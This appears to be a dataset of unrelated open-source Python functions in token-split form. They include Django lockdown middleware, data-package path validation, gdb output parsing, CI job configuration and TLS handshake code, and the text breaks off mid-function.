def process_request ( self , request ) : try : session = request . session except AttributeError : raise ImproperlyConfigured ( 'django-lockdown requires the Django ' 'sessions framework' ) # Don't lock down if django-lockdown is disabled altogether. if settings . ENABLED is False : return None # Don't lock down if the client REMOTE_ADDR matched and is part of the # exception list. if self . remote_addr_exceptions : remote_addr_exceptions = self . remote_addr_exceptions else : remote_addr_exceptions = settings . REMOTE_ADDR_EXCEPTIONS if remote_addr_exceptions : # If forwarding proxies are used they must be listed as trusted trusted_proxies = self . trusted_proxies or settings . TRUSTED_PROXIES remote_addr = request . META . get ( 'REMOTE_ADDR' ) if remote_addr in remote_addr_exceptions : return None if remote_addr in trusted_proxies : # If REMOTE_ADDR is a trusted proxy check x-forwarded-for x_forwarded_for = request . META . get ( 'HTTP_X_FORWARDED_FOR' ) if x_forwarded_for : remote_addr = x_forwarded_for . split ( ',' ) [ - 1 ] . strip ( ) if remote_addr in remote_addr_exceptions : return None # Don't lock down if the URL matches an exception pattern. if self . url_exceptions : url_exceptions = compile_url_exceptions ( self . url_exceptions ) else : url_exceptions = compile_url_exceptions ( settings . URL_EXCEPTIONS ) for pattern in url_exceptions : if pattern . search ( request . path ) : return None # Don't lock down if the URL resolves to a whitelisted view. try : resolved_path = resolve ( request . path ) except Resolver404 : pass else : if resolved_path . func in settings . VIEW_EXCEPTIONS : return None # Don't lock down if outside of the lockdown dates. if self . until_date : until_date = self . until_date else : until_date = settings . UNTIL_DATE if self . after_date : after_date = self . after_date else : after_date = settings . AFTER_DATE if until_date or after_date : locked_date = False if until_date and datetime . datetime . now ( ) < until_date : locked_date = True if after_date and datetime . datetime . now ( ) > after_date : locked_date = True if not locked_date : return None form_data = request . POST if request . method == 'POST' else None if self . form : form_class = self . form else : form_class = get_lockdown_form ( settings . FORM ) form = form_class ( data = form_data , * * self . form_kwargs ) authorized = False token = session . get ( self . session_key ) if hasattr ( form , 'authenticate' ) : if form . authenticate ( token ) : authorized = True elif token is True : authorized = True if authorized and self . logout_key and self . logout_key in request . GET : if self . session_key in session : del session [ self . session_key ] querystring = request . GET . copy ( ) del querystring [ self . logout_key ] return self . redirect ( request ) # Don't lock down if the user is already authorized for previewing. if authorized : return None if form . is_valid ( ) : if hasattr ( form , 'generate_token' ) : token = form . generate_token ( ) else : token = True session [ self . session_key ] = token return self . redirect ( request ) page_data = { 'until_date' : until_date , 'after_date' : after_date } if not hasattr ( form , 'show_form' ) or form . show_form ( ) : page_data [ 'form' ] = form if self . extra_context : page_data . update ( self . extra_context ) return render ( request , 'lockdown/form.html' , page_data )
def redirect ( self , request ) : url = request . path querystring = request . GET . copy ( ) if self . logout_key and self . logout_key in request . GET : del querystring [ self . logout_key ] if querystring : url = '%s?%s' % ( url , querystring . urlencode ( ) ) return HttpResponseRedirect ( url )
def get_descriptor_base_path ( descriptor ) : # Infer from path/url if isinstance ( descriptor , six . string_types ) : if os . path . exists ( descriptor ) : base_path = os . path . dirname ( os . path . abspath ( descriptor ) ) else : # suppose descriptor is a URL base_path = os . path . dirname ( descriptor ) # Current dir by default else : base_path = '.' return base_path
def is_safe_path ( path ) : contains_windows_var = lambda val : re . match ( r'%.+%' , val ) contains_posix_var = lambda val : re . match ( r'\$.+' , val ) unsafeness_conditions = [ os . path . isabs ( path ) , ( '..%s' % os . path . sep ) in path , path . startswith ( '~' ) , os . path . expandvars ( path ) != path , contains_windows_var ( path ) , contains_posix_var ( path ) , ] return not any ( unsafeness_conditions )
def _validate_zip ( the_zip ) : datapackage_jsons = [ f for f in the_zip . namelist ( ) if f . endswith ( 'datapackage.json' ) ] if len ( datapackage_jsons ) != 1 : msg = 'DataPackage must have only one "datapackage.json" (had {n})' raise exceptions . DataPackageException ( msg . format ( n = len ( datapackage_jsons ) ) )
def validate ( self ) : # Deprecate warnings . warn ( 'Property "package.validate" is deprecated.' , UserWarning ) descriptor = self . to_dict ( ) self . profile . validate ( descriptor )
def iter_errors ( self ) : # Deprecate warnings . warn ( 'Property "package.iter_errors" is deprecated.' , UserWarning ) return self . profile . iter_errors ( self . to_dict ( ) )
def iter_errors ( self , data ) : # Deprecate warnings . warn ( 'Property "profile.iter_errors" is deprecated.' , UserWarning ) for error in self . _validator . iter_errors ( data ) : yield error
def _get_responses_windows ( self , timeout_sec ) : timeout_time_sec = time . time ( ) + timeout_sec responses = [ ] while True : try : self . gdb_process . stdout . flush ( ) if PYTHON3 : raw_output = self . gdb_process . stdout . readline ( ) . replace ( b"\r" , b"\n" ) else : raw_output = self . gdb_process . stdout . read ( ) . replace ( b"\r" , b"\n" ) responses += self . _get_responses_list ( raw_output , "stdout" ) except IOError : pass try : self . gdb_process . stderr . flush ( ) if PYTHON3 : raw_output = self . gdb_process . stderr . readline ( ) . replace ( b"\r" , b"\n" ) else : raw_output = self . gdb_process . stderr . read ( ) . replace ( b"\r" , b"\n" ) responses += self . _get_responses_list ( raw_output , "stderr" ) except IOError : pass if time . time ( ) > timeout_time_sec : break return responses
def _get_responses_unix ( self , timeout_sec ) : timeout_time_sec = time . time ( ) + timeout_sec responses = [ ] while True : select_timeout = timeout_time_sec - time . time ( ) # I prefer to not pass a negative value to select if select_timeout <= 0 : select_timeout = 0 events , _ , _ = select . select ( self . read_list , [ ] , [ ] , select_timeout ) responses_list = None # to avoid infinite loop if using Python 2 try : for fileno in events : # new data is ready to read if fileno == self . stdout_fileno : self . gdb_process . stdout . flush ( ) raw_output = self . gdb_process . stdout . read ( ) stream = "stdout" elif fileno == self . stderr_fileno : self . gdb_process . stderr . flush ( ) raw_output = self . gdb_process . stderr . read ( ) stream = "stderr" else : raise ValueError ( "Developer error. Got unexpected file number %d" % fileno ) responses_list = self . _get_responses_list ( raw_output , stream ) responses += responses_list except IOError : # only occurs in python 2.7 pass if timeout_sec == 0 : # just exit immediately break elif responses_list and self . _allow_overwrite_timeout_times : # update timeout time to potentially be closer to now to avoid lengthy wait times when nothing is being output by gdb timeout_time_sec = min ( time . time ( ) + self . time_to_check_for_additional_output_sec , timeout_time_sec , ) elif time . time ( ) > timeout_time_sec : break return responses
def _get_notify_msg_and_payload ( result , stream ) : token = stream . advance_past_chars ( [ "=" , "*" ] ) token = int ( token ) if token != "" else None logger . debug ( "%s" , fmt_green ( "parsing message" ) ) message = stream . advance_past_chars ( [ "," ] ) logger . debug ( "parsed message" ) logger . debug ( "%s" , fmt_green ( message ) ) payload = _parse_dict ( stream ) return token , message . strip ( ) , payload
def _get_result_msg_and_payload ( result , stream ) : groups = _GDB_MI_RESULT_RE . match ( result ) . groups ( ) token = int ( groups [ 0 ] ) if groups [ 0 ] != "" else None message = groups [ 1 ] if groups [ 2 ] is None : payload = None else : stream . advance_past_chars ( [ "," ] ) payload = _parse_dict ( stream ) return token , message , payload
def cleanup ( self ) : if self . subscription : logger . info ( "Deleting worker subscription..." ) self . subscriber_client . delete_subscription ( self . subscription )
def enqueue ( self , f , * args , * * kwargs ) : task = Task ( uuid4 ( ) . hex , f , args , kwargs ) self . storage . put_task ( task ) return self . enqueue_task ( task )
def service_start ( service = None , param = None ) : if service is not None : to_run = [ "python" , service ] if param is not None : to_run += param return subprocess . Popen ( to_run ) return False
def update_running_pids ( old_procs ) : new_procs = [ ] for proc in old_procs : if proc . poll ( ) is None and check_pid ( proc . pid ) : publisher . debug ( str ( proc . pid ) + ' is alive' ) new_procs . append ( proc ) else : try : publisher . debug ( str ( proc . pid ) + ' is gone' ) os . kill ( proc . pid , signal . SIGKILL ) except : # the process is just already gone pass return new_procs
def fsplit ( file_to_split ) : dirname = file_to_split + '_splitted' if not os . path . exists ( dirname ) : os . mkdir ( dirname ) part_file_size = os . path . getsize ( file_to_split ) / number_of_files + 1 splitted_files = [ ] with open ( file_to_split , "r" ) as f : number = 0 actual = 0 while 1 : prec = actual # Jump of "size" from the current place in the file f . seek ( part_file_size , os . SEEK_CUR ) # find the next separator or EOF s = f . readline ( ) if len ( s ) == 0 : s = f . readline ( ) while len ( s ) != 0 and s != separator : s = f . readline ( ) # Get the current place actual = f . tell ( ) new_file = os . path . join ( dirname , str ( number ) ) # Create the new file with open ( file_to_split , "r" ) as temp : temp . seek ( prec ) # Get the text we want to put in the new file copy = temp . read ( actual - prec ) # Write the new file open ( new_file , 'w' ) . write ( copy ) splitted_files . append ( new_file ) number += 1 # End of file if len ( s ) == 0 : break return splitted_files
def already_downloaded ( filename ) : cur_file = os . path . join ( c . bview_dir , filename ) old_file = os . path . join ( c . bview_dir , 'old' , filename ) if not os . path . exists ( cur_file ) and not os . path . exists ( old_file ) : return False return True
def get_page_url ( page_num , current_app , url_view_name , url_extra_args , url_extra_kwargs , url_param_name , url_get_params , url_anchor ) : if url_view_name is not None : # Add page param to the kwargs list. Overrides any previously set parameter of the same name. url_extra_kwargs [ url_param_name ] = page_num try : url = reverse ( url_view_name , args = url_extra_args , kwargs = url_extra_kwargs , current_app = current_app ) except NoReverseMatch as e : # Attempt to load view from application root, allowing the use of non-namespaced view names if your view is defined in the root application if settings . SETTINGS_MODULE : if django . VERSION < ( 1 , 9 , 0 ) : separator = '.' else : separator = ':' # Namespace separator changed to colon after 1.8 project_name = settings . SETTINGS_MODULE . split ( '.' ) [ 0 ] try : url = reverse ( project_name + separator + url_view_name , args = url_extra_args , kwargs = url_extra_kwargs , current_app = current_app ) except NoReverseMatch : raise e # Raise the original exception so the error message doesn't confusingly include something the Developer didn't add to the view name themselves else : raise e # We can't determine the project name so just re-throw the exception else : url = '' url_get_params = url_get_params or QueryDict ( url ) url_get_params = url_get_params . copy ( ) url_get_params [ url_param_name ] = str ( page_num ) if len ( url_get_params ) > 0 : if not isinstance ( url_get_params , QueryDict ) : tmp = QueryDict ( mutable = True ) tmp . update ( url_get_params ) url_get_params = tmp url += '?' + url_get_params . urlencode ( ) if ( url_anchor is not None ) : url += '#' + url_anchor return url
def configure_ci_jobs ( config_url , rosdistro_name , ci_build_name , groovy_script = None , dry_run = False ) : config = get_config_index ( config_url ) build_files = get_ci_build_files ( config , rosdistro_name ) build_file = build_files [ ci_build_name ] index = get_index ( config . rosdistro_index_url ) # get targets targets = [ ] for os_name in build_file . targets . keys ( ) : for os_code_name in build_file . targets [ os_name ] . keys ( ) : for arch in build_file . targets [ os_name ] [ os_code_name ] : targets . append ( ( os_name , os_code_name , arch ) ) print ( 'The build file contains the following targets:' ) for os_name , os_code_name , arch in targets : print ( '  -' , os_name , os_code_name , arch ) dist_file = get_distribution_file ( index , rosdistro_name , build_file ) if not dist_file : print ( 'No distribution file matches the build file' ) return ci_view_name = get_ci_view_name ( rosdistro_name ) # all further configuration will be handled by either the Jenkins API # or by a generated groovy script from ros_buildfarm . jenkins import connect jenkins = connect ( config . jenkins_url ) if groovy_script is None else False view_configs = { } views = { ci_view_name : configure_ci_view ( jenkins , ci_view_name , dry_run = dry_run ) } if not jenkins : view_configs . update ( views ) groovy_data = { 'dry_run' : dry_run , 'expected_num_views' : len ( view_configs ) , } ci_job_names = [ ] job_configs = OrderedDict ( ) is_disabled = False for os_name , os_code_name , arch in targets : try : job_name , job_config = configure_ci_job ( config_url , rosdistro_name , ci_build_name , os_name , os_code_name , arch , config = config , build_file = build_file , index = index , dist_file = dist_file , jenkins = jenkins , views = views , is_disabled = is_disabled , groovy_script = groovy_script , dry_run = dry_run , trigger_timer = build_file . jenkins_job_schedule ) ci_job_names . append ( job_name ) if groovy_script is not None : print ( "Configuration for job '%s'" % job_name ) job_configs [ job_name ] = job_config except JobValidationError as e : print ( e . message , file = sys . stderr ) groovy_data [ 'expected_num_jobs' ] = len ( job_configs ) groovy_data [ 'job_prefixes_and_names' ] = { } if groovy_script is not None : print ( "Writing groovy script '%s' to reconfigure %d jobs" % ( groovy_script , len ( job_configs ) ) ) content = expand_template ( 'snippet/reconfigure_jobs.groovy.em' , groovy_data ) write_groovy_script_and_configs ( groovy_script , content , job_configs , view_configs )
def _obtain_credentials ( self ) : protocol_values = { 'SSLv3' : Secur32Const . SP_PROT_SSL3_CLIENT , 'TLSv1' : Secur32Const . SP_PROT_TLS1_CLIENT , 'TLSv1.1' : Secur32Const . SP_PROT_TLS1_1_CLIENT , 'TLSv1.2' : Secur32Const . SP_PROT_TLS1_2_CLIENT , } protocol_bit_mask = 0 for key , value in protocol_values . items ( ) : if key in self . _protocols : protocol_bit_mask |= value algs = [ Secur32Const . CALG_AES_128 , Secur32Const . CALG_AES_256 , Secur32Const . CALG_3DES , Secur32Const . CALG_SHA1 , Secur32Const . CALG_ECDHE , Secur32Const . CALG_DH_EPHEM , Secur32Const . CALG_RSA_KEYX , Secur32Const . CALG_RSA_SIGN , Secur32Const . CALG_ECDSA , Secur32Const . CALG_DSS_SIGN , ] if 'TLSv1.2' in self . _protocols : algs . extend ( [ Secur32Const . CALG_SHA512 , Secur32Const . CALG_SHA384 , Secur32Const . CALG_SHA256 , ] ) alg_array = new ( secur32 , 'ALG_ID[%s]' % len ( algs ) ) for index , alg in enumerate ( algs ) : alg_array [ index ] = alg flags = Secur32Const . SCH_USE_STRONG_CRYPTO | Secur32Const . SCH_CRED_NO_DEFAULT_CREDS if not self . _manual_validation and not self . _extra_trust_roots : flags |= Secur32Const . SCH_CRED_AUTO_CRED_VALIDATION else : flags |= Secur32Const . SCH_CRED_MANUAL_CRED_VALIDATION schannel_cred_pointer = struct ( secur32 , 'SCHANNEL_CRED' ) schannel_cred = unwrap ( schannel_cred_pointer ) schannel_cred . dwVersion = Secur32Const . SCHANNEL_CRED_VERSION schannel_cred . cCreds = 0 schannel_cred . paCred = null ( ) schannel_cred . hRootStore = null ( ) schannel_cred . cMappers = 0 schannel_cred . aphMappers = null ( ) schannel_cred . cSupportedAlgs = len ( alg_array ) schannel_cred . palgSupportedAlgs = alg_array schannel_cred . grbitEnabledProtocols = protocol_bit_mask schannel_cred . dwMinimumCipherStrength = 0 schannel_cred . dwMaximumCipherStrength = 0 # Default session lifetime is 10 hours schannel_cred . dwSessionLifespan = 0 schannel_cred . dwFlags = flags schannel_cred . dwCredFormat = 0 cred_handle_pointer = new ( secur32 , 'CredHandle *' ) result = secur32 . AcquireCredentialsHandleW ( null ( ) , Secur32Const . UNISP_NAME , Secur32Const . SECPKG_CRED_OUTBOUND , null ( ) , schannel_cred_pointer , null ( ) , null ( ) , cred_handle_pointer , null ( ) ) handle_error ( result ) self . _credentials_handle = cred_handle_pointer
def close ( self ) : try : self . shutdown ( ) finally : if self . _socket : try : self . _socket . close ( ) except ( socket_ . error ) : pass self . _socket = None
def _handshake ( self ) : self . _ssl = None self . _rbio = None self . _wbio = None try : self . _ssl = libssl . SSL_new ( self . _session . _ssl_ctx ) if is_null ( self . _ssl ) : self . _ssl = None handle_openssl_error ( 0 ) mem_bio = libssl . BIO_s_mem ( ) self . _rbio = libssl . BIO_new ( mem_bio ) if is_null ( self . _rbio ) : handle_openssl_error ( 0 ) self . _wbio = libssl . BIO_new ( mem_bio ) if is_null ( self . _wbio ) : handle_openssl_error ( 0 ) libssl . SSL_set_bio ( self . _ssl , self . _rbio , self . _wbio ) utf8_domain = self . _hostname . encode ( 'utf-8' ) libssl . SSL_ctrl ( self . _ssl , LibsslConst . SSL_CTRL_SET_TLSEXT_HOSTNAME , LibsslConst . TLSEXT_NAMETYPE_host_name , utf8_domain ) libssl . SSL_set_connect_state ( self . _ssl ) if self . _session . _ssl_session : libssl . SSL_set_session ( self . _ssl , self . _session . _ssl_session ) self . _bio_write_buffer = buffer_from_bytes ( self . _buffer_size ) self . _read_buffer = buffer_from_bytes ( self . _buffer_size ) handshake_server_bytes = b'' handshake_client_bytes = b'' while True : result = libssl . SSL_do_handshake ( self . _ssl ) handshake_client_bytes += self . _raw_write ( ) if result == 1 : break error = libssl . SSL_get_error ( self . _ssl , result ) if error == LibsslConst . SSL_ERROR_WANT_READ : chunk = self . _raw_read ( ) if chunk == b'' : if handshake_server_bytes == b'' : raise_disconnection ( ) if detect_client_auth_request ( handshake_server_bytes ) : raise_client_auth ( ) raise_protocol_error ( handshake_server_bytes ) handshake_server_bytes += chunk elif error == LibsslConst . SSL_ERROR_WANT_WRITE : handshake_client_bytes += self . _raw_write ( ) elif error == LibsslConst . SSL_ERROR_ZERO_RETURN : self . _gracefully_closed = True self . _shutdown ( False ) self . _raise_closed ( ) else : info = peek_openssl_error ( ) if libcrypto_version_info < ( 1 , 1 ) : dh_key_info = ( 20 , LibsslConst . SSL_F_SSL3_CHECK_CERT_AND_ALGORITHM , LibsslConst . SSL_R_DH_KEY_TOO_SMALL ) else : dh_key_info = ( 20 , LibsslConst . SSL_F_TLS_PROCESS_SKE_DHE , LibsslConst . SSL_R_DH_KEY_TOO_SMALL ) if info == dh_key_info : raise_dh_params ( ) if libcrypto_version_info < ( 1 , 1 ) : unknown_protocol_info = ( 20 , LibsslConst . SSL_F_SSL23_GET_SERVER_HELLO , LibsslConst . SSL_R_UNKNOWN_PROTOCOL ) else : unknown_protocol_info = ( 20 , LibsslConst . SSL_F_SSL3_GET_RECORD , LibsslConst . SSL_R_WRONG_VERSION_NUMBER ) if info == unknown_protocol_info : raise_protocol_error ( handshake_server_bytes ) tls_version_info_error = ( 20 , LibsslConst . SSL_F_SSL23_GET_SERVER_HELLO , LibsslConst . SSL_R_TLSV1_ALERT_PROTOCOL_VERSION ) if info == tls_version_info_error : raise_protocol_version ( ) handshake_error_info = ( 20 , LibsslConst . SSL_F_SSL23_GET_SERVER_HELLO , LibsslConst . SSL_R_SSLV3_ALERT_HANDSHAKE_FAILURE ) if info == handshake_error_info : raise_handshake ( ) handshake_failure_info = ( 20 , LibsslConst . SSL_F_SSL3_READ_BYTES , LibsslConst . SSL_R_SSLV3_ALERT_HANDSHAKE_FAILURE ) if info == handshake_failure_info : raise_client_auth ( ) if libcrypto_version_info < ( 1 , 1 ) : cert_verify_failed_info = ( 20 , LibsslConst . SSL_F_SSL3_GET_SERVER_CERTIFICATE , LibsslConst . SSL_R_CERTIFICATE_VERIFY_FAILED ) else : cert_verify_failed_info = ( 20 , LibsslConst . SSL_F_TLS_PROCESS_SERVER_CERTIFICATE , LibsslConst . SSL_R_CERTIFICATE_VERIFY_FAILED ) if info == cert_verify_failed_info : verify_result = libssl . SSL_get_verify_result ( self . _ssl ) chain = extract_chain ( handshake_server_bytes ) self_signed = False time_invalid = False no_issuer = False cert = None oscrypto_cert = None if chain : cert = chain [ 0 ] oscrypto_cert = load_certificate ( cert ) self_signed = oscrypto_cert . self_signed issuer_error_codes = set ( [ LibsslConst . X509_V_ERR_DEPTH_ZERO_SELF_SIGNED_CERT , LibsslConst . X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN , LibsslConst . X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY ] ) if verify_result in issuer_error_codes : no_issuer = not self_signed time_error_codes = set ( [ LibsslConst . X509_V_ERR_CERT_HAS_EXPIRED , LibsslConst . X509_V_ERR_CERT_NOT_YET_VALID ] ) time_invalid = verify_result in time_error_codes if time_invalid : raise_expired_not_yet_valid ( cert ) if no_issuer : raise_no_issuer ( cert ) if self_signed : raise_self_signed ( cert ) if oscrypto_cert and oscrypto_cert . asn1 . hash_algo in set ( [ 'md5' , 'md2' ] ) : raise_weak_signature ( oscrypto_cert ) raise_verification ( cert ) handle_openssl_error ( 0 , TLSError ) session_info = parse_session_info ( handshake_server_bytes , handshake_client_bytes ) self . _protocol = session_info [ 'protocol' ] self . _cipher_suite = session_info [ 'cipher_suite' ] self . _compression = session_info [ 'compression' ] self . _session_id = session_info [ 'session_id' ] self . _session_ticket = session_info [ 'session_ticket' ] if self . _cipher_suite . find ( '_DHE_' ) != - 1 : dh_params_length = get_dh_params_length ( handshake_server_bytes ) if dh_params_length < 1024 : self . close ( ) raise_dh_params ( ) # When saving the session for future requests, we use # SSL_get1_session() variant to increase the reference count. This # prevents the session from being freed when one connection closes # before another is opened. However, since we increase the ref # count, we also have to explicitly free any previous session. if self . _session_id == 'new' or self . _session_ticket == 'new' : if self . _session . _ssl_session : libssl . SSL_SESSION_free ( self . _session . _ssl_session ) self . _session . _ssl_session = libssl . SSL_get1_session ( self . _ssl ) if not self . _session . _manual_validation : if self . certificate . hash_algo in set ( [ 'md5' , 'md2' ] ) : raise_weak_signature ( self . certificate ) # OpenSSL does not do hostname or IP address checking in the end # entity certificate, so we must perform that check if not self . certificate . is_valid_domain_ip ( self . _hostname ) : raise_hostname ( self . certificate , self . _hostname ) except ( OSError , socket_ . error ) : if self . _ssl : libssl . SSL_free ( self . _ssl ) self . _ssl = None self . _rbio = None self . _wbio = None # The BIOs are freed by SSL_free(), so we only need to free # them if for some reason SSL_free() was not called else : if self . _rbio : libssl . BIO_free ( self . _rbio ) self . _rbio = None if self . _wbio : libssl . BIO_free ( self . _wbio ) self . _wbio = None self . close ( ) raise
def _handshake ( self ) : session_context = None ssl_policy_ref = None crl_search_ref = None crl_policy_ref = None ocsp_search_ref = None ocsp_policy_ref = None policy_array_ref = None try : if osx_version_info < ( 10 , 8 ) : session_context_pointer = new ( Security , 'SSLContextRef *' ) result = Security . SSLNewContext ( False , session_context_pointer ) handle_sec_error ( result ) session_context = unwrap ( session_context_pointer ) else : session_context = Security . SSLCreateContext ( null ( ) , SecurityConst . kSSLClientSide , SecurityConst . kSSLStreamType ) result = Security . SSLSetIOFuncs ( session_context , _read_callback_pointer , _write_callback_pointer ) handle_sec_error ( result ) self . _connection_id = id ( self ) % 2147483647 _connection_refs [ self . _connection_id ] = self _socket_refs [ self . _connection_id ] = self . _socket result = Security . SSLSetConnection ( session_context , self . _connection_id ) handle_sec_error ( result ) utf8_domain = self . _hostname . encode ( 'utf-8' ) result = Security . SSLSetPeerDomainName ( session_context , utf8_domain , len ( utf8_domain ) ) handle_sec_error ( result ) if osx_version_info >= ( 10 , 10 ) : disable_auto_validation = self . _session . _manual_validation or self . _session . _extra_trust_roots explicit_validation = ( not self . _session . _manual_validation ) and self . _session . _extra_trust_roots else : disable_auto_validation = True explicit_validation = not self . _session . _manual_validation # Ensure requested protocol support is set for the session if osx_version_info < ( 10 , 8 ) : for protocol in [ 'SSLv2' , 'SSLv3' , 'TLSv1' ] : protocol_const = _PROTOCOL_STRING_CONST_MAP [ protocol ] enabled = protocol in self . _session . _protocols result = Security . SSLSetProtocolVersionEnabled ( session_context , protocol_const , enabled ) handle_sec_error ( result ) if disable_auto_validation : result = Security . SSLSetEnableCertVerify ( session_context , False ) handle_sec_error ( result ) else : protocol_consts = [ _PROTOCOL_STRING_CONST_MAP [ protocol ] for protocol in self . _session . _protocols ] min_protocol = min ( protocol_consts ) max_protocol = max ( protocol_consts ) result = Security . SSLSetProtocolVersionMin ( session_context , min_protocol ) handle_sec_error ( result ) result = Security . SSLSetProtocolVersionMax ( session_context , max_protocol ) handle_sec_error ( result ) if disable_auto_validation : result = Security . SSLSetSessionOption ( session_context , SecurityConst . kSSLSessionOptionBreakOnServerAuth , True ) handle_sec_error ( result ) # Disable all sorts of bad cipher suites supported_ciphers_pointer = new ( Security , 'size_t *' ) result = Security . SSLGetNumberSupportedCiphers ( session_context , supported_ciphers_pointer ) handle_sec_error ( result ) supported_ciphers = deref ( supported_ciphers_pointer ) cipher_buffer = buffer_from_bytes ( supported_ciphers * 4 ) supported_cipher_suites_pointer = cast ( Security , 'uint32_t *' , cipher_buffer ) result = Security . SSLGetSupportedCiphers ( session_context , supported_cipher_suites_pointer , supported_ciphers_pointer ) handle_sec_error ( result ) supported_ciphers = deref ( supported_ciphers_pointer ) supported_cipher_suites = array_from_pointer ( Security , 'uint32_t' , supported_cipher_suites_pointer , supported_ciphers ) good_ciphers = [ ] for supported_cipher_suite in supported_cipher_suites : cipher_suite = int_to_bytes ( supported_cipher_suite , width = 2 ) cipher_suite_name = CIPHER_SUITE_MAP . get ( cipher_suite , cipher_suite ) good_cipher = _cipher_blacklist_regex . search ( cipher_suite_name ) is None if good_cipher : good_ciphers . append ( supported_cipher_suite ) num_good_ciphers = len ( good_ciphers ) good_ciphers_array = new ( Security , 'uint32_t[]' , num_good_ciphers ) array_set ( good_ciphers_array , good_ciphers ) good_ciphers_pointer = cast ( Security , 'uint32_t *' , good_ciphers_array ) result = Security . SSLSetEnabledCiphers ( session_context , good_ciphers_pointer , num_good_ciphers ) handle_sec_error ( result ) # Set a peer id from the session to allow for session reuse, the hostname # is appended to prevent a bug on OS X 10.7 where it tries to reuse a # connection even if the hostnames are different. peer_id = self . _session . _peer_id + self . _hostname . encode ( 'utf-8' ) result = Security . SSLSetPeerID ( session_context , peer_id , len ( peer_id ) ) handle_sec_error ( result ) handshake_result = Security . SSLHandshake ( session_context ) if self . _exception is not None : exception = self . _exception self . _exception = None raise exception while handshake_result == SecurityConst . errSSLWouldBlock : handshake_result = Security . SSLHandshake ( session_context ) if self . _exception is not None : exception = self . _exception self . _exception = None raise exception if osx_version_info < ( 10 , 8 ) and osx_version_info >= ( 10 , 7 ) : do_validation = explicit_validation and handshake_result == 0 else : do_validation = explicit_validation and handshake_result == SecurityConst . errSSLServerAuthCompleted if do_validation : trust_ref_pointer = new ( Security , 'SecTrustRef *' ) result = Security . SSLCopyPeerTrust ( session_context , trust_ref_pointer ) handle_sec_error ( result ) trust_ref = unwrap ( trust_ref_pointer ) cf_string_hostname = CFHelpers . cf_string_from_unicode ( self . _hostname ) ssl_policy_ref = Security . SecPolicyCreateSSL ( True , cf_string_hostname ) result = CoreFoundation . CFRelease ( cf_string_hostname ) handle_cf_error ( result ) # Create a new policy for OCSP checking to disable it ocsp_oid_pointer = struct ( Security , 'CSSM_OID' ) ocsp_oid = unwrap ( ocsp_oid_pointer ) ocsp_oid . Length = len ( SecurityConst . APPLE_TP_REVOCATION_OCSP ) ocsp_oid_buffer = buffer_from_bytes ( SecurityConst . APPLE_TP_REVOCATION_OCSP ) ocsp_oid . Data = cast ( Security , 'char *' , ocsp_oid_buffer ) ocsp_search_ref_pointer = new ( Security , 'SecPolicySearchRef *' ) result = Security . SecPolicySearchCreate ( SecurityConst . CSSM_CERT_X_509v3 , ocsp_oid_pointer , null ( ) , ocsp_search_ref_pointer ) handle_sec_error ( result ) ocsp_search_ref = unwrap ( ocsp_search_ref_pointer ) ocsp_policy_ref_pointer = new ( Security , 'SecPolicyRef *' ) result = Security . SecPolicySearchCopyNext ( ocsp_search_ref , ocsp_policy_ref_pointer ) handle_sec_error ( result ) ocsp_policy_ref = unwrap ( ocsp_policy_ref_pointer ) ocsp_struct_pointer = struct ( Security , 'CSSM_APPLE_TP_OCSP_OPTIONS' ) ocsp_struct = unwrap ( ocsp_struct_pointer ) ocsp_struct . Version = SecurityConst . CSSM_APPLE_TP_OCSP_OPTS_VERSION ocsp_struct . Flags = ( SecurityConst . CSSM_TP_ACTION_OCSP_DISABLE_NET | SecurityConst . CSSM_TP_ACTION_OCSP_CACHE_READ_DISABLE ) ocsp_struct_bytes = struct_bytes ( ocsp_struct_pointer ) cssm_data_pointer = struct ( Security , 'CSSM_DATA' ) cssm_data = unwrap ( cssm_data_pointer ) cssm_data . Length = len ( ocsp_struct_bytes ) ocsp_struct_buffer = buffer_from_bytes ( ocsp_struct_bytes ) cssm_data . Data = cast ( Security , 'char *' , ocsp_struct_buffer ) result = Security . SecPolicySetValue ( ocsp_policy_ref , cssm_data_pointer ) handle_sec_error ( result ) # Create a new policy for CRL checking to disable it crl_oid_pointer = struct ( Security , 'CSSM_OID' ) crl_oid = unwrap ( crl_oid_pointer ) crl_oid . Length = len ( SecurityConst . APPLE_TP_REVOCATION_CRL ) crl_oid_buffer = buffer_from_bytes ( SecurityConst . APPLE_TP_REVOCATION_CRL ) crl_oid . Data = cast ( Security , 'char *' , crl_oid_buffer ) crl_search_ref_pointer = new ( Security , 'SecPolicySearchRef *' ) result = Security . SecPolicySearchCreate ( SecurityConst . CSSM_CERT_X_509v3 , crl_oid_pointer , null ( ) , crl_search_ref_pointer ) handle_sec_error ( result ) crl_search_ref = unwrap ( crl_search_ref_pointer ) crl_policy_ref_pointer = new ( Security , 'SecPolicyRef *' ) result = Security . SecPolicySearchCopyNext ( crl_search_ref , crl_policy_ref_pointer ) handle_sec_error ( result ) crl_policy_ref = unwrap ( crl_policy_ref_pointer ) crl_struct_pointer = struct ( Security , 'CSSM_APPLE_TP_CRL_OPTIONS' ) crl_struct = unwrap ( crl_struct_pointer ) crl_struct . Version = SecurityConst . CSSM_APPLE_TP_CRL_OPTS_VERSION crl_struct . CrlFlags = 0 crl_struct_bytes = struct_bytes ( crl_struct_pointer ) cssm_data_pointer = struct ( Security , 'CSSM_DATA' ) cssm_data = unwrap ( cssm_data_pointer ) cssm_data . Length = len ( crl_struct_bytes ) crl_struct_buffer = buffer_from_bytes ( crl_struct_bytes ) cssm_data . Data = cast ( Security , 'char *' , crl_struct_buffer ) result = Security . SecPolicySetValue ( crl_policy_ref , cssm_data_pointer ) handle_sec_error ( result ) policy_array_ref = CFHelpers . cf_array_from_list ( [ ssl_policy_ref , crl_policy_ref , ocsp_policy_ref ] ) result = Security . SecTrustSetPolicies ( trust_ref , policy_array_ref ) handle_sec_error ( result ) if self . _session . _extra_trust_roots : ca_cert_refs = [ ] ca_certs = [ ] for cert in self . _session . _extra_trust_roots : ca_cert = load_certificate ( cert ) ca_certs . append ( ca_cert ) ca_cert_refs . append ( ca_cert . sec_certificate_ref ) result = Security . SecTrustSetAnchorCertificatesOnly ( trust_ref , False ) handle_sec_error ( result ) array_ref = CFHelpers . cf_array_from_list ( ca_cert_refs ) result = Security . SecTrustSetAnchorCertificates ( trust_ref , array_ref ) handle_sec_error ( result ) result_pointer = new ( Security , 'SecTrustResultType *' ) result = Security . SecTrustEvaluate ( trust_ref , result_pointer ) handle_sec_error ( result ) trust_result_code = deref ( result_pointer ) invalid_chain_error_codes = set ( [ SecurityConst . kSecTrustResultProceed , 